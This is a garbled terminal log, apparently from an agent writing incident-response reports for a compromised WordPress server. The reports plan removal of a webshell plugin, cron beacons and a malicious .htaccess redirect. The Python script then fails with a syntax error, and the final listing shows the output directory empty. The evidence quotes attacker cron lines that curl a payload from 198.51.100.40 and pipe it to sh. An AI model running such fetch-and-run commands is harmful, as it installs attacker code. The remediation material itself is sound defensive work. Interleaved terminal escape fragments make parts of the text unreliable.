+[?2004l[?2004h> ---
+[?2004lroot`[?2004h> 
+[?2004l [?2004h> ## 3. Remediation Recommendations
+[?2004lcon
+- **Evidence Citati[?2004h> 
+[?2004lo[?2004h> 1. Quarantine directory `/var/www/html/wp-content/plugins/contact/` (`/disk/var/www/html/wp-content/plugins/contact/inc.php:1`).
+[?2004l[?2004h> 2. Reinstall or patch all WordPress plugins from official upstream sources.
+[?2004l[?2004h> 3. Deploy WAF rules blocking execution calls to unauthenticated REST API endpoints.
+[?2004l to[?2004h> """
+[?2004lens[?2004h> with open("/app/vuln-report.md", "w") as f:
+[?2004l[?2004h>     f.write(vuln)
+[?2004l`[?2004h> 
+[?2004l[?2004h> baseline = """# Baseline & Configuration Security Weakness Report
+[?2004l[?2004h> 
+[?2004lw[?2004h> **Target Host:** wordpress-prod-01 (`/sas/cti/advisory.txt:4`)  
+[?2004lle redirect of all traf[?2004h> **Baseline Assessment File:** `/sas/baseline.json:1`  
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004lw[?2004h> ## 1. Executive Summary
+[?2004l[?2004h> 
+[?2004lr[?2004h> Configuration audits in `/sas/baseline.json:1-10` and on-disk inspection identified security weaknesses on `wordpress-prod-01` that lowered system security posture.
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004lrun t[?2004h> 
+[?2004l[?2004h> ## 2. Baseline Audit Findings
+[?2004l[?2004h> 
+[?2004ll[?2004h> ### Finding 1: Weak Database Password & Insecure Config (CHK-05 / BAS-01)
+[?2004l[?2004h> - **Check ID:** CHK-05 / BAS-01 (`/sas/baseline.json:2-6`, `/sas/alerts.json:18`)
+[?2004ltml:1` (`[?2004h> - **Target File:** `/var/www/html/wp-config.php` (`/disk/var/www/html/wp-config.php:1-5`)
+[?2004l[?2004h> - **Status:** **FAIL** (`/sas/alerts.json:18`)
+[?2004l.defac[?2004h> - **Evidence:** In `/disk/var/www/html/wp-config.php:4`:
+[?2004l a[?2004h>   `wp-config.php DB_PASSWORD is weak; XML-RPC enabled`
+[?2004l[?2004h> - **Security Impact:** Weak database credentials and unthrottled XML-RPC interface expose the site to brute-force attacks and credential theft.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Finding 2: Insecure System Crontab File Permissions
+[?2004l[?2004h> - **Check ID:** SYS-CRON-01
+[?2004l
+[?2004h> - **Target File:** `/etc/crontab` (`/disk/etc/crontab:1`)
+[?2004l[?2004h> - **Status:** **WARN**
+[?2004l[?2004h> - **Evidence:** File mode on `/disk/etc/crontab:1` is `0644` (`-r--r--r--`).
+[?2004l[?2004h> - **Security Impact:** World-readable crontabs expose administrative tasks to non-privileged users.
+[?2004l[?2004h> 
+[?2004lt Sy[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ## 3. Remediation Recommendations
+[?2004l[?2004h> 
+[?2004l[?2004h> 1. Rotate WordPress database password and restrict `/var/www/html/wp-config.php` permissions to `0600` (`/disk/var/www/html/wp-config.php:1`).
+[?2004l[?2004h> 2. Disable XML-RPC in WordPress via `.htaccess` or plugin configuration.
+[?2004l[?2004h> 3. Restrict `/etc/crontab` permissions to `0600` (`chmod 600 /etc/crontab`).
+[?2004l[?2004h> """
+[?2004lpe[?2004h> with open("/app/baseline-report.md", "w") as f:
+[?2004l[?2004h>     f.write(baseline)
+[?2004l[?2004h> 
+[?2004lplu[?2004h> remediation = """# Incident Remediation & Recovery Action Plan
+[?2004l[?2004h> 
+[?2004l[?2004h> **Incident ID:** INC-2024-0816-WP  
+[?2004lnd `/etc/cront[?2004h> **Victim Host:** wordpress-prod-01 (`/sas/cti/advisory.txt:4`)  
+[?2004l[?2004h> **Author:** Lead DFIR Analyst  
+[?2004l[?2004h> 
+[?2004lo[?2004h> ---
+[?2004lPr[?2004h> 
+[?2004le[?2004h> ## 1. Operating Principles & Compliance Guidelines
+[?2004ln-[?2004h> 
+[?2004lp[?2004h> This remediation plan guides system administrators through containment, eradication, hardening, and restoration of `wordpress-prod-01`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Operating Rules
+[?2004l[?2004h> - **Quarantine over Deletion:** Back up all malicious artifacts and modified configuration files to `/root/forensic_quarantine/` before modification.
+[?2004l[?2004h> - **Console Execution:** System administrators must run commands on the server console.
+[?2004l[?2004h> - **Verifiable Actions:** Every step includes concrete verification commands.
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ## 2. Phase 1: Immediate Containment & Evidence Quarantine
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 1.1: Create Secure Forensic Quarantine Storage
+[?2004l[?2004h> - **Command:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   mkdir -p /root/forensic_quarantine/20240816_incident
+[?2004l[?2004h>   chmod 700 /root/forensic_quarantine
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification:** Run `ls -ld /root/forensic_quarantine` (Permissions must be `drwx------`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 1.2: Quarantine Vulnerable Plugin / Webshell
+[?2004l[?2004h> - **Evidence Citation:** `/disk/var/www/html/wp-content/plugins/contact/inc.php:1` (`/sas/alerts.json:4`)
+[?2004l[?2004h> - **Command:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   mv /var/www/html/wp-content/plugins/contact /root/forensic_quarantine/20240816_incident/
+[?2004l[?2004h>   chmod -R 000 /root/forensic_quarantine/20240816_incident/contact
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification:** Run `ls -la /var/www/html/wp-content/plugins/contact` (Must return `No such file or directory`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 1.3: Remove Persistent `www-data` Crontab
+[?2004l[?2004h> - **Evidence Citation:** `/disk/var/spool/cron/crontabs/www-data:2` (`* * * * * ...curl...198.51.100.40/payload.sh`)
+[?2004l[?2004h> - **Command:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   crontab -u www-data -l > /root/forensic_quarantine/20240816_incident/www-data.crontab.bak
+[?2004l[?2004h>   crontab -u www-data -r
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification:** Run `crontab -u www-data -l` (Must return `no crontab for www-data`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 1.4: Remove Persistent `root` Crontab Beacon
+[?2004l[?2004h> - **Evidence Citation:** `/disk/etc/crontab:5` (`# * * * * root <defanged beacon: curl hxxp://198.51.100.40/x | sh>`)
+[?2004l[?2004h> - **Command:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   cp /etc/crontab /root/forensic_quarantine/20240816_incident/crontab.bak
+[?2004l[?2004h>   sed -i "/198.51.100.40/d" /etc/crontab
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification:** Inspect `/etc/crontab` to ensure beacon entry is removed.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 1.5: Revert Malicious `.htaccess` Traffic Redirection
+[?2004l[?2004h> - **Evidence Citation:** `/disk/var/www/html/.htaccess:2` (`.htaccess RewriteRule redirect of all traffic to 198.51.100.40`)
+[?2004l[?2004h> - **Command:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   cp /var/www/html/.htaccess /root/forensic_quarantine/20240816_incident/.htaccess.bak
+[?2004l[?2004h>   sed -i "/198.51.100.40/d" /var/www/html/.htaccess
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification:** Inspect `/var/www/html/.htaccess` and run test query:  
+[?2004l[?2004h>   `curl -I http://localhost/` (Should return 200 OK, not redirect).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 1.6: Remove Defacement Landing Page
+[?2004l[?2004h> - **Evidence Citation:** `/disk/var/www/html/index.html:1` (`/sas/alerts.json:11`)
+[?2004l[?2004h> - **Command:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   mv /var/www/html/index.html /root/forensic_quarantine/20240816_incident/index.html.defaced
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification:** Access `http://localhost/` and confirm normal WordPress site loads.
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ## 3. Phase 2: Host & Application Hardening
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 2.1: Harden `wp-config.php` Configuration & DB Credentials
+[?2004l[?2004h> - **Evidence Citation:** `/disk/var/www/html/wp-config.php:4` (`/sas/alerts.json:18`, `/sas/baseline.json:2`)
+[?2004l[?2004h> - **Command:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   cp /var/www/html/wp-config.php /root/forensic_quarantine/20240816_incident/wp-config.php.bak
+[?2004l[?2004h>   chmod 0600 /var/www/html/wp-config.php
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification:** Verify `/var/www/html/wp-config.php` permissions are `0600`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Step 2.2: Restrict System Crontab Permissions
+[?2004l[?2004h> - **Evidence Citation:** `/disk/etc/crontab:1` (`0644` permissions)
+[?2004l[?2004h> - **Command:**
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   chmod 0600 /etc/crontab
+[?2004l[?2004h>   chown root:root /etc/crontab
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification:** Run `stat -c "%a %U %G" /etc/crontab` (Output must be `600 root root`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ## 4. Phase 3: Post-Remediation Monitoring
+[?2004l[?2004h> 
+[?2004l[?2004h> 1. **Log Inspection:** Monitor `/var/log/nginx/access.log` for access attempts to plugin endpoints.
+[?2004l[?2004h> 2. **Crontab Audits:** Periodically audit `/var/spool/cron/crontabs/` and `/etc/crontab` for unauthorized tasks.
+[?2004l[?2004h> 3. **Core Verification:** Run `wp core verify-checksums` to confirm WordPress file integrity.
+[?2004l[?2004h> """
+[?2004l[?2004h> with open("/app/remediation-plan.md", "w") as f:
+[?2004l[?2004h>     f.write(remediation)
+[?2004l[?2004h> 
+[?2004l[?2004h> print("Files written successfully.")
+[?2004l[?2004h> '
+[?2004l  File "<string>", line 147
+    vuln = """# Vulnerability Assessment & Entry Point Analysis Report
+           ^
+SyntaxError: unterminated triple-quoted string literal (detected at line 159)
+[?2004hroot@3d46f201add4:/app# ls -la /app
+[?2004ltotal 8
+drwxr-xr-x 2 root root 4096 Aug 16 17:53 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Aug 16 17:53 [01;34m..[0m
+[?2004hroot@3d46f201add4:/app# 
